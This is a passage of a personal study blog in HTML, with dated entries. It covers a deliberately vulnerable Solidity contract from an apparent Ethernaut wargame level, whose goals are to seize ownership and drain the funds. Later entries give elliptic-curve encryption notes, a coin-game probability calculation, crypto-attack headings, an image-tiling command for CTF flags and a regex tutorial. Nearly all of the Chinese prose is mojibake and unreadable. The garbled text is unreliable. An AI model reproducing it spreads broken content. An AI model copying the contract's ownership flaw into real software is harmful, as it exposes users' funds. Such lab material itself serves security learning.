&#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TWO-targets"><a href="#TWO-targets" class="headerlink" title="TWO targets"></a>TWO targets</h3><ul>
<li>you claim ownership of the contract</li>
<li>you reduce its balance to 0</li>
</ul>
<p><em>ç¬¬ä¸€ä¸ªå³æ‹¿åˆ°è¯¥åˆçº¦çš„æ‰€æœ‰æƒï¼Œ<code>receive()</code>å‡½æ•°ç»™åˆçº¦è½¬ä¸€ç¬”è´¦ï¼Œæ‰€æœ‰è€…å³å˜æˆè‡ªå·±ã€‚</em></p>
<p>å€’æ¨ä»¥ä¸‹ï¼š<code>reveive() &lt;- contributions() &lt;- </code></p>
<p>çª’æ¯ï¼Œçƒ¦æ­»ï¼Œè¢«banäº†å¥½çƒ¦äººã€‚</p>
<p>å›å®¶ç”¨ç”µè„‘æ•´æ´»å§å—¨ã€‚</p>
<h1 id="230516"><a href="#230516" class="headerlink" title="230516"></a>230516</h1><img src="/2023/12/31/WeeklyStudy/image-20230516092945918.png" class="" title="image-20230516092945918">

<img src="/2023/12/31/WeeklyStudy/image-20230516094834387.png" class="" title="image-20230516094834387">

<img src="/2023/12/31/WeeklyStudy/image-20230516094848524.png" class="" title="image-20230516094848524">

<img src="/2023/12/31/WeeklyStudy/image-20230516094917443.png" class="" title="image-20230516094917443">

<img src="/2023/12/31/WeeklyStudy/image-20230516094935039.png" class="" title="image-20230516094935039">



<img src="/2023/12/31/WeeklyStudy/image-20230516101933511.png" class="" title="image-20230516101933511">



<img src="/2023/12/31/WeeklyStudy/image-20230516102023594.png" class="" title="image-20230516102023594">

<img src="/2023/12/31/WeeklyStudy/image-20230516105302029.png" class="" title="image-20230516105302029">

<p>ç”¨æˆ·Aå…ˆé€‰æ‹©ä¸€æ¡æ¤­åœ†æ›²çº¿$E_q(a, b)$ï¼Œç„¶åé€‰æ‹©å…¶ä¸Šçš„ä¸€ä¸ªç”Ÿæˆå…ƒGï¼Œå‡è®¾å…¶é˜¶ä¸º$n$ï¼Œä¹‹åå†é€‰æ‹©ä¸€ä¸ªæ­£æ•´æ•°$n_a$ä½œä¸ºå¯†é’¥ï¼Œè®¡ç®—$P_a &#x3D; n_a G$ã€‚</p>
<p>å…¶ä¸­ï¼Œ$E_q(a, b)$ï¼Œ$q$ï¼Œ$G$éƒ½ä¼šè¢«å…¬å¼€ã€‚</p>
<p>å…¬é’¥ä¸º$P_a$ï¼Œç§é’¥ä¸º$n_a$ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¤­åœ†æ›²çº¿åŠ å¯†ï¼ŒåŠ è§£å¯†è¿‡ç¨‹ï¼š</span><br><span class="line">æ¤­åœ†æ›²çº¿Ep(a,b)ï¼ˆpä¸ºæ¨¡æ•°ï¼‰ï¼ŒåŸºç‚¹G(x,y)ï¼ŒGç‚¹çš„é˜¶æ•°nï¼Œç§é’¥kï¼Œå…¬é’¥K(x,y)ï¼Œéšæœºæ•´æ•°rï¼Œæ˜æ–‡ä¸ºä¸€ç‚¹m(x,y)ï¼Œå¯†æ–‡ä¸ºä¸¤ç‚¹c1(x,y)å’Œc2(x,y)</span><br><span class="line">ï¼ˆå…¶ä¸­åŸºç‚¹Gï¼Œæ˜æ–‡mï¼Œå¯†æ–‡c1ã€c2éƒ½æ˜¯æ¤­åœ†æ›²çº¿Eä¸Šçš„ç‚¹ï¼‰</span><br><span class="line">é€‰æ‹©ç§é’¥kï¼ˆk&lt;nï¼‰</span><br><span class="line">å¾—åˆ°å…¬é’¥K = k*G</span><br><span class="line">é€‰æ‹©éšæœºæ•´æ•°rï¼ˆr&lt;nï¼‰</span><br><span class="line">åŠ å¯†ï¼š</span><br><span class="line">c1 = m+r*K</span><br><span class="line">c2 = r*G</span><br><span class="line">è§£å¯†ï¼šm = c1-k*c2</span><br></pre></td></tr></table></figure>

<h1 id="230525"><a href="#230525" class="headerlink" title="230525"></a>230525</h1><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>å„è‡ªæ‹¿ç¡¬å¸</p>
<ul>
<li>++ 3</li>
<li>â€“ 1</li>
<li>+- (-2)</li>
</ul>
<p><strong>äº®ç¡¬å¸</strong>ï¼Œèµ¢é¢ä¸º50%ã€‚</p>
<p>proofï¼š<br>$$<br>\frac{1}{4} \times 3 + \frac{1}{4} \times 1 + \frac{1}{2}\times (-2) &#x3D; 0<br>$$<br>å‡å®šï¼š</p>
<table>
<thead>
<tr>
<th>äººå‘˜</th>
<th>æ­£é¢</th>
<th>åé¢</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>$\frac{3}{8}$</td>
<td>$\frac{5}{8}$</td>
</tr>
<tr>
<td>B</td>
<td>$x$</td>
<td>$1-x$</td>
</tr>
</tbody></table>
<p>é¢„æœŸï¼š</p>
<table>
<thead>
<tr>
<th>æƒ…å†µ</th>
<th>æ¦‚ç‡</th>
<th>æ”¶å…¥</th>
</tr>
</thead>
<tbody><tr>
<td>æ­£æ­£</td>
<td>$\frac{3}{8}x$</td>
<td>3</td>
</tr>
<tr>
<td>æ­£å</td>
<td>$\frac{3}{8}(1-x)$</td>
<td>-2</td>
</tr>
<tr>
<td>åæ­£</td>
<td>$\frac{5}{8}x$</td>
<td>-2</td>
</tr>
<tr>
<td>åå</td>
<td>$\frac{5}{8}(1-x)$</td>
<td>1</td>
</tr>
</tbody></table>
<p>è®¡ç®—çš„é¢„æœŸä¸º$-\frac{1}{8}$ï¼Œç­‰äºè¯´æ¯è½®éƒ½åœ¨äºæŸã€‚</p>
<h1 id="230531"><a href="#230531" class="headerlink" title="230531"></a>230531</h1><h2 id="OTP-MTPæ”»å‡»"><a href="#OTP-MTPæ”»å‡»" class="headerlink" title="OTP-MTPæ”»å‡»"></a>OTP-MTPæ”»å‡»</h2><img src="/2023/12/31/WeeklyStudy/image-20230531102653629.png" class="" title="image-20230531102653629">

<h2 id="Coppersmith-Short-padæ”»å‡»"><a href="#Coppersmith-Short-padæ”»å‡»" class="headerlink" title="Coppersmith-Short padæ”»å‡»"></a>Coppersmith-Short padæ”»å‡»</h2><img src="/2023/12/31/WeeklyStudy/image-20230531105043543.png" class="" title="image-20230531105043543">

<h1 id="230601"><a href="#230601" class="headerlink" title="230601"></a>230601</h1><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><h3 id="å®‰è£…Rust"><a href="#å®‰è£…Rust" class="headerlink" title="å®‰è£…Rust"></a>å®‰è£…Rust</h3><p>æ­¥éª¤å¿˜è®°å½•äº†ï¼Œç›´æ¥æŸ¥çœ‹æ˜¯å¦è¿è¡ŒæˆåŠŸã€‚</p>
<p><em>å·²è½¬ç§»ã€‚</em></p>
<h1 id="230605"><a href="#230605" class="headerlink" title="230605"></a>230605</h1><h2 id="æ•°æ®å¤„ç†-1"><a href="#æ•°æ®å¤„ç†-1" class="headerlink" title="æ•°æ®å¤„ç†"></a>æ•°æ®å¤„ç†</h2><p>æ¶‰åŠæ•°æ®è„±æ•ï¼Œæ•°æ®æŸ¥æ‰¾ç­‰ç›¸å…³ä»£ç ç®—æ³•ã€‚</p>
<h2 id="æ•°æ®ç”Ÿå‘½å‘¨æœŸ"><a href="#æ•°æ®ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="æ•°æ®ç”Ÿå‘½å‘¨æœŸ"></a>æ•°æ®ç”Ÿå‘½å‘¨æœŸ</h2><h3 id="é™æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ"><a href="#é™æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="é™æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ"></a>é™æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ</h3><img src="/2023/12/31/WeeklyStudy/image-20230605092655302.png" class="" title="image-20230605092655302">

<h3 id="åŠ¨æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ"><a href="#åŠ¨æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="åŠ¨æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ"></a>åŠ¨æ€æ•°æ®ç”Ÿå‘½å‘¨æœŸ</h3><img src="/2023/12/31/WeeklyStudy/image-20230605092734244.png" class="" title="image-20230605092734244">

<h2 id="æ•°æ®ä¼ è¾“"><a href="#æ•°æ®ä¼ è¾“" class="headerlink" title="æ•°æ®ä¼ è¾“"></a>æ•°æ®ä¼ è¾“</h2><ul>
<li>æ•°æ®ä¼ è¾“ä¸‰è¦ç´ </li>
</ul>
<h1 id="230609"><a href="#230609" class="headerlink" title="230609"></a>230609</h1><h2 id="åˆ‡å‰²å›¾ç‰‡"><a href="#åˆ‡å‰²å›¾ç‰‡" class="headerlink" title="åˆ‡å‰²å›¾ç‰‡"></a>åˆ‡å‰²å›¾ç‰‡</h2><blockquote>
<p><a href="https://imgtool.net/imagesplit/">å›¾ç‰‡åˆ†å‰² - å›¾æ–‡å·¥å…·ç®± - imgtool.net</a></p>
</blockquote>
<h2 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">montage *.png -tile 10x10 -geometry +0+0 flag.png</span><br></pre></td></tr></table></figure>

<ul>
<li>10Ã—10ï¼Œè¡¨ç¤ºè¯¥å›¾ç‰‡å¤§å°ï¼Œç†è®ºä¸Šåº”è¯¥æœ‰100å¼ å›¾ç‰‡</li>
<li>+0+0ï¼Œè¡¨ç¤ºè¾¹æ¡†ä¸º0ï¼Œé€šå¸¸æƒ…å†µä¸‹ä½¿ç”¨è¯¥å‘½ä»¤</li>
</ul>
<h1 id="230625"><a href="#230625" class="headerlink" title="230625"></a>230625</h1><h2 id="ç²¾é€šæ­£åˆ™è¡¨è¾¾å¼"><a href="#ç²¾é€šæ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="ç²¾é€šæ­£åˆ™è¡¨è¾¾å¼"></a>ç²¾é€šæ­£åˆ™è¡¨è¾¾å¼</h2><p><img src="/../../../Desktop/24-04-02-lyjh/regex.jpg" alt="img"></p>
<p><em>åŒ¹é…ï¼šè‡³å°‘ä¸€ä½æ•°å­—ï¼ˆ0åˆ°9çš„ä»»æ„ç»„åˆï¼‰å¼€å§‹ï¼Œæ¥ä¸‹æ¥æ˜¯å­—ç¬¦aï¼Œæ¥ä¸‹æ¥æ˜¯å­—ç¬¦bï¼Œæœ€åä»¥å­—ç¬¦cç»“å°¾ã€‚</em></p>
<p>å®Œæ•´çš„æ­£åˆ™è¡¨è¾¾å¼ç”±ä¸¤ç§å­—ç¬¦æ„æˆã€‚ç‰¹æ®Šå­—ç¬¦ç§°ä¸ºâ€<strong>å…ƒå­—ç¬¦</strong>â€œï¼Œå…¶ä»–ä¸º<strong>æ™®é€šæ–‡æœ¬å­—ç¬¦</strong>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¸Šé¢å›¾ç‰‡ä¸¾ä¾‹</span><br><span class="line">æ™®é€šå­—ç¬¦ï¼š0 9 a b c</span><br><span class="line">å…ƒå­—ç¬¦ï¼š^ [ ] - + $</span><br></pre></td></tr></table></figure>

<p><em>è¯»æ­£åˆ™è¡¨è¾¾å¼æ—¶<strong>é‡åˆ°å…ƒå­—ç¬¦å°†ä»–è§£é‡Šæˆä¸ºå…¶å¯¹åº”çš„æ™®é€šå­—ç¬¦</strong>ï¼Œè¿™æ ·å°±èƒ½å¤Ÿç†è§£è®°å¿†è€Œä¸æ˜¯æ­»è®°ç¡¬èƒŒã€‚</em></p>
<h3 id="è¡Œçš„èµ·å§‹ä¸ç»“æŸ"><a href="#è¡Œçš„èµ·å§‹ä¸ç»“æŸ" class="headerlink" title="è¡Œçš„èµ·å§‹ä¸ç»“æŸ"></a>è¡Œçš„èµ·å§‹ä¸ç»“æŸ</h3><ul>
<li><code>^</code>ï¼šç”¨äºå°†åŒ¹é…æ–‡æœ¬é”šå®šåœ¨ä¸€è¡Œçš„å¼€å¤´</li>
<li><code>$</code>ï¼šç”¨ä¸å°†åŒ¹é…æ–‡æœ¬é”šå®šåœ¨ä¸€è¡Œçš„ç»“å°¾</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^cat åŒ¹é…ä»¥cä½œä¸ºä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œç´§æ¥ç€ä¸€ä¸ªa, ç´§æ¥ç€ä¸€ä¸ªtçš„æ–‡æœ¬</span><br><span class="line">cat$ åŒ¹é…ä»¥å­—ç¬¦catä¸ºä¸€è¡Œç»“å°¾çš„æ–‡æœ¬</span><br><span class="line">^$ åŒ¹é…ç©ºè¡Œï¼Œæ²¡æœ‰ä»»ä½•å­—ç¬¦</span><br></pre></td></tr></table></figure>

<h3 id="å­—ç¬¦ç»„ä¸æ’é™¤å­—ç¬¦ç»„"><a href="#å­—ç¬¦ç»„ä¸æ’é™¤å­—ç¬¦ç»„" class="headerlink" title="å­—ç¬¦ç»„ä¸æ’é™¤å­—ç¬¦ç»„"></a>å­—ç¬¦ç»„ä¸æ’é™¤å­—ç¬¦ç»„</h3><ul>
<li><code>[]</code>ï¼šåŒ¹é…æ–¹æ‹¬å·ä¸­çš„è‹¥å¹²å­—ç¬¦ä¹‹ä¸€</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gr[ae]y åŒ¹é…å­—ç¬¦ä¸²gray æˆ–è€… grey</span><br><span class="line">H[1-6] å­—ç¬¦ç»„å…ƒå­—ç¬¦&#x27;-&#x27;è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼ŒåŒ¹é…H1,H2,H3,H4,H5,H6</span><br><span class="line">[0-9A-Z_!.?] åŒ¹é…ä¸€ä¸ªæ•°å­—ï¼Œå¤§å†™å­—æ¯ï¼Œä¸‹åˆ’çº¿ï¼ŒæƒŠå¹å·ï¼Œç‚¹å·ï¼Œæˆ–è€…æ˜¯é—®å·</span><br><span class="line">[-_.?] åŒ¹é…è¿å­—ç¬¦ï¼Œä¸‹åˆ’çº¿ï¼Œç‚¹å·ï¼Œé—®å·</span><br></pre></td></tr></table></figure>

<p><strong>TIPSï¼š</strong></p>
<ul>
<li><p>å­—ç¬¦ç»„ä»¥å¤–çš„æ™®é€šå­—ç¬¦éƒ½æœ‰â€œæ¥ä¸‹æ¥æ˜¯â€çš„æ„æ€ï¼Œå­—ç¬¦ç»„çš„å†…å®¹æ˜¯åœ¨åŒä¸€ä¸ªä½ç½®èƒ½å¤ŸåŒ¹é…è‹¥å¹²å­—ç¬¦ï¼Œå®ƒçš„æ„æ€æ˜¯â€œæˆ–â€ã€‚</p>
</li>
<li><p>è¿å­—ç¬¦<code>-</code>åªæœ‰åœ¨å­—ç¬¦ç»„å†…éƒ¨å¹¶ä¸”æ²¡æœ‰å‡ºç°åœ¨å­—ç¬¦ç»„çš„å¼€å¤´ï¼Œå®ƒæ‰æ˜¯å­—ç¬¦ç»„å…ƒå­—ç¬¦, ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œå¦åˆ™å®ƒå°±åªèƒ½åŒ¹é…æ™®é€šçš„è¿å­—ç¬¦å·ã€‚</p>
</li>
<li><p>å­—ç¬¦<code>. ?</code> åœ¨å­—ç¬¦ç»„å¤–æ˜¯å…ƒå­—ç¬¦ï¼Œä½†åœ¨å­—ç¬¦ç»„å†…ä»–ä»¬éƒ½è¢«å½“ä½œæ™®é€šå­—ç¬¦ã€‚</p>
</li>
<li><p><code>[^]</code>ï¼šåŒ¹é…ä¸€ä¸ªé™¤äº†æ‹¬å·ä¸­ä»»ä½•æœªåˆ—å‡ºçš„å­—ç¬¦</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[^1-6] åŒ¹é…é™¤äº†1åˆ°6ä»¥å¤–çš„ä»»ä½•å­—ç¬¦</span><br><span class="line">q[^u] åŒ¹é…qåé¢ç´§æ¥ç€ä¸€ä¸ªé™¤äº†uä»¥ä¸ºçš„ä»»ä½•ä¸€ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<h3 id="ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦"><a href="#ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦" class="headerlink" title="ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦"></a>ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦</h3><ul>
<li><code>.</code>ï¼šåŒ¹é…ä»»æ„å­—ç¬¦</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">03[-./]19[-./]76 åŒ¹é…03-19-76, 03.19.76, 03/19/76</span><br><span class="line">03.19.76 åŒ¹é…03-19-76, 03.19.76, 03/19/76</span><br></pre></td></tr></table></figure>

<p>TIPSï¼š</p>
<ul>
<li><p>åœ¨å­—ç¬¦ç»„ä¸­çš„.å¹¶ä¸æ˜¯å…ƒå­—ç¬¦ï¼Œè€Œæ˜¯æ™®é€šå­—ç¬¦ç‚¹å·</p>
</li>
<li><p>åœ¨å­—ç¬¦ç»„ä¸­çš„-ä¹Ÿä¸æ˜¯å…ƒå­—ç¬¦ï¼Œå› ä¸ºå®ƒåœ¨å­—ç¬¦ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®</p>
</li>
<li><p>åœ¨å­—ç¬¦ç»„å¤–çš„.æ˜¯ä¸€ä¸ªå…ƒå­—ç¬¦ï¼Œå¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦åŒ…æ‹¬æ™®é€šå­—ç¬¦ç‚¹å·</p>
</li>
<li><p>ç¬¬ä¸€ä¸ªåŒ¹é…æ›´åŠ ç²¾ç¡®ï¼Œä½†æ˜¯æ›´éš¾è¯»ï¼Œä¹Ÿæ›´éš¾å†™ã€‚ç¬¬äºŒä¸ªåŒ¹é…æ›´å®¹æ˜“ç†è§£ï¼Œä½†æ˜¯ä¸å¤Ÿç»†è‡´ã€‚ä½¿ç”¨å“ªä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå–å†³äºä½ å¯¹æ£€ç´¢æ–‡æœ¬çš„äº†è§£ï¼Œä»¥åŠä½ éœ€è¦è¾¾åˆ°çš„å‡†ç¡®ç¨‹åº¦ã€‚å†™æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¯¹æ¬²æ£€ç´¢æ–‡æœ¬çš„äº†è§£ç¨‹åº¦ä¸æ£€ç´¢ç²¾ç¡®æ€§ä¹‹é—´æ±‚å¾—å¹³è¡¡ã€‚</p>
</li>
</ul>
<h3 id="å¤šé€‰ç»“æ„"><a href="#å¤šé€‰ç»“æ„" class="headerlink" title="å¤šé€‰ç»“æ„"></a>å¤šé€‰ç»“æ„</h3><ul>
<li><code>|</code>ï¼šåŒ¹é…åˆ†å‰²ä¸¤è¾¹çš„ä»»æ„ä¸€ä¸ªè¡¨è¾¾å¼</li>
<li><code>()</code>ï¼šåˆ’å®šå¤šé€‰ç»“æ„çš„ä½œç”¨èŒƒå›´</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åŒ¹é…grey æˆ–è€… gray</span><br><span class="line">gr[ea]y</span><br><span class="line">grey|gray</span><br><span class="line">gr(a|e)y</span><br><span class="line"></span><br><span class="line"># åŒ¹é…Jeffrey æˆ–è€…Jeffery</span><br><span class="line">Jeffrey|Jeffery </span><br><span class="line">Jeff(rey|ery)</span><br><span class="line">Jeff(re|er)y</span><br><span class="line"></span><br><span class="line"># åŒ¹é…ä»¥From,Subjectæˆ–è€…Dateå¼€å¤´ç´§è·Ÿç€å†’å·çš„å­—ç¬¦ä¸²</span><br><span class="line">^(From|Subject|Date):</span><br></pre></td></tr></table></figure>

<p><strong>TIPSï¼š</strong></p>
<ul>
<li>ä¸€ä¸ªå­—ç¬¦ç»„åªèƒ½åŒ¹é…ç›®æ ‡æ–‡æœ¬ä¸­çš„å•ä¸ªå­—ç¬¦ï¼Œè€Œæ¯ä¸ªå¤šé€‰ç»“æ„è‡ªèº«éƒ½å¯èƒ½æ˜¯å®Œæ•´çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œéƒ½å¯ä»¥åŒ¹é…ä»»æ„é•¿åº¦çš„æ–‡æœ¬ã€‚</li>
<li>å­—ç¬¦ç»„åŸºæœ¬å¯ä»¥ç®—æ˜¯ä¸€é—¨ç‹¬ç«‹çš„å¾®å‹è¯­è¨€ï¼Œå¯¹äºå…ƒå­—ç¬¦ï¼Œå®ƒä»¬æœ‰è‡ªå·±çš„è§„å®šã€‚è€Œå¤šé€‰ç»“æ„æ˜¯æ­£åˆ™è¡¨è¾¾å¼è¯­è¨€ä¸»ä½“çš„ä¸€éƒ¨åˆ†ã€‚</li>
</ul>
<h3 id="å•è¯åˆ†ç•Œç¬¦"><a href="#å•è¯åˆ†ç•Œç¬¦" class="headerlink" title="å•è¯åˆ†ç•Œç¬¦"></a>å•è¯åˆ†ç•Œç¬¦</h3><ul>
<li><code>\&lt;</code>ï¼šåŒ¹é…å•è¯çš„èµ·å§‹ä½ç½®</li>
<li><code>\&gt;</code>ï¼šåŒ¹é…å•è¯çš„ç»“æŸä½ç½®</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&lt;cat\&gt; åŒ¹é…å•è¯cat</span><br></pre></td></tr></table></figure>

<p><strong>TIPSï¼š</strong></p>
<ul>
<li><code>&lt;</code>å’Œ<code>&gt;</code>æœ¬èº«å¹¶ä¸æ˜¯å…ƒå­—ç¬¦ï¼Œåªæœ‰å½“å®ƒä»¬ä¸æ–œçº¿ç»“åˆèµ·æ¥çš„æ—¶å€™ï¼Œæ•´ä¸ªåºåˆ—æ‰å…·æœ‰ç‰¹æ®Šæ„ä¹‰ï¼Œå®ƒä»¬è¢«ç§°ä¸º<strong>å…ƒå­—ç¬¦åºåˆ—</strong>ã€‚</li>
<li>åœ¨æŸäº›è¯­è¨€æˆ–è€…å·¥å…·ä¸­<code>\b</code> ç”¨æ¥è¡¨ç¤ºå•è¯åˆ†ç•Œç¬¦</li>
</ul>
<h3 id="å¯é€‰é¡¹å…ƒç´ "><a href="#å¯é€‰é¡¹å…ƒç´ " class="headerlink" title="å¯é€‰é¡¹å…ƒç´ "></a>å¯é€‰é¡¹å…ƒç´ </h3><ul>
<li><code>?</code>ï¼šè¡¨ç¤ºåœ¨å®ƒä¹‹å‰çš„å­—ç¬¦å¯æœ‰å¯æ— </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">colou?r  åŒ¹é…color æˆ–è€… colour</span><br><span class="line">July? åŒ¹é…Jul æˆ–è€… July</span><br></pre></td></tr></table></figure>

<h3 id="é‡è¯"><a href="#é‡è¯" class="headerlink" title="é‡è¯"></a>é‡è¯</h3><ul>
<li><code>+</code> åœ¨å®ƒä¹‹å‰ç´§é‚»çš„å…ƒç´ å‡ºç°ä¸€æ¬¡æˆ–ä»»æ„å¤šæ¬¡</li>
<li><code>*</code> åœ¨å®ƒä¹‹å‰ç´§é‚»çš„å…ƒç´ å‡ºç°ä»»æ„å¤šæ¬¡æˆ–è€…ä¸å‡ºç°</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;hr +size=[0-9]+ *&gt; åŒ¹é…åœ¨sizeä¹‹å‰è‡³å°‘æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œåœ¨=ä¹‹åè‡³å°‘æœ‰ä¸€ä¸ªæ•°å­—ï¼Œåœ¨&gt;ä¹‹å‰æœ‰ä»»æ„å¤šä¸ªç©ºæ ¼</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒ¹é…ä¼˜å…ˆé‡è¯ (åŒ¹é…å°½å¯èƒ½å¤šçš„å†…å®¹)<br><code>* + ? &#123;min, max&#125;</code></li>
<li>å¿½ç•¥ä¼˜å…ˆé‡è¯ (åŒ¹é…å°½å¯èƒ½å°‘çš„å†…å®¹)<br><code>*? +? ?? &#123;min, max&#125;?</code></li>
<li>å æœ‰ä¼˜å…ˆé‡è¯ (ç±»ä¼¼å›ºåŒ–åˆ†ç»„ï¼Œä¸€æ—¦åŒ¹é…åˆ°æŸäº›å†…å®¹å°±å›ºå®šä¸‹æ¥ä¸ä¼šäº¤è¿˜)<br><code>*+ ++ ?+ &#123;min, max&#125;+</code></li>
</ul>
<h3 id="åŒºé—´é‡è¯"><a href="#åŒºé—´é‡è¯" class="headerlink" title="åŒºé—´é‡è¯"></a>åŒºé—´é‡è¯</h3><ul>
<li><code>&#123;min, max&#125;</code> è¡¨ç¤ºåœ¨å®ƒä¹‹å‰çš„å…ƒç´ æœ€å°‘å‡ºç°minæ¬¡ï¼Œæœ€å¤šå‡ºç°maxæ¬¡</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-zA-Z]&#123;1,5&#125; åŒ¹é…1åˆ°5ä¸ªå¤§å°å†™å­—æ¯</span><br></pre></td></tr></table></figure>

<h3 id="åˆ†ç»„ä¸åå‘å¼•ç”¨"><a href="#åˆ†ç»„ä¸åå‘å¼•ç”¨" class="headerlink" title="åˆ†ç»„ä¸åå‘å¼•ç”¨"></a>åˆ†ç»„ä¸åå‘å¼•ç”¨</h3><ul>
<li><code>()</code> æ•è·åˆ†ç»„,èƒ½å¤Ÿè®°ä½å­è¡¨è¾¾å¼åŒ¹é…çš„æ–‡æœ¬</li>
<li><code>\1</code> å¼•ç”¨ç¬¬ä¸€ç»„åœ†æ‹¬å·åŒ¹é…çš„æ–‡æœ¬</li>
<li><code>\2</code> å¼•ç”¨ç¬¬äºŒç»„åœ†æ‹¬å·åŒ¹é…çš„æ–‡æœ¬</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&lt;([A-Za-z]+) +\1\&gt;  åŒ¹é…é‡å¤çš„å•è¯ï¼Œå¦‚ the the</span><br><span class="line">([a-z])([0-9])\1\2 åŒ¹é…ä¸€ä¸ªå­—æ¯ç´§æ¥ä¸€ä¸ªæ•°å­—ï¼Œæ¥ä¸‹æ¥é‡å¤ä¹‹å‰åŒ¹é…çš„å­—æ¯å’ŒåŒ¹é…çš„æ•°å­— å¦‚ï¼ša1a1</span><br></pre></td></tr></table></figure>

<ul>
<li>éæ•è·å‹åˆ†ç»„ <code>(?:)</code><br>è¡¨ç¤ºåªåˆ†ç»„ä¸æ•è·, æé«˜åŒ¹é…æ•ˆç‡å¹¶ä¸”æ— æ³•å¼•ç”¨åŒ¹é…å†…å®¹</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?:[a-z])</span><br></pre></td></tr></table></figure>

<ul>
<li>å‘½åæ•è·åˆ†ç»„ <code>(?&lt;Name&gt;)</code><br>ç»™åˆ†ç»„å‘½åä¸ºArea</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?&lt;Area&gt;\d\d\d)</span><br></pre></td></tr></table></figure>

<ul>
<li>å›ºåŒ–åˆ†ç»„ <code>(?&gt;)</code><br>å›ºåŒ–å·²ç»æ•è·çš„å†…å®¹ä¸ä¼šå†æ”¹å˜</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i.*! å¯ä»¥åŒ¹é…iHola!</span><br><span class="line">i(?&gt;.*)! æ— æ³•åŒ¹é…iHola! ç”±äºæ­£åˆ™å¼•æ“åŒ¹é…æ—¶ï¼Œ*å·²ç»åŒ¹é…åˆ°!, å·²ç»å›ºåŒ–ï¼Œæ— æ³•å†æ’¤é”€é‡æ–°åŒ¹é…</span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ¡ä»¶åˆ¤æ–­ <code>(?if then |else)</code><br>if éƒ¨åˆ†ä¸ºç‰¹æ®Šçš„æ¡ä»¶è¡¨è¾¾å¼ï¼Œthen å’Œelse éƒ¨åˆ†ä¸ºæ™®é€šçš„å­è¡¨è¾¾å¼ï¼Œå¦‚æœiféƒ¨åˆ†æµ‹è¯•ä¸ºçœŸï¼Œåˆ™å°è¯•thençš„è¡¨è¾¾å¼ï¼Œå¦åˆ™å°è¯•elseéƒ¨åˆ†ã€‚else éƒ¨åˆ†ä¹Ÿå¯ä»¥ä¸å‡ºç°ï¼Œå¹¶ä¸”çœç•¥<code>|</code>ã€‚<br>iféƒ¨åˆ†å› æ­£åˆ™æµæ´¾ä¸åŒè€Œä¸åŒï¼Œä½†å¤§å¤šæ•°éƒ½å®¹è®¸åœ¨å…¶ä¸­å¼•ç”¨æ•è·çš„å­è¡¨è¾¾å¼å’Œç¯è§†ç»“æ„ã€‚</p>
<ul>
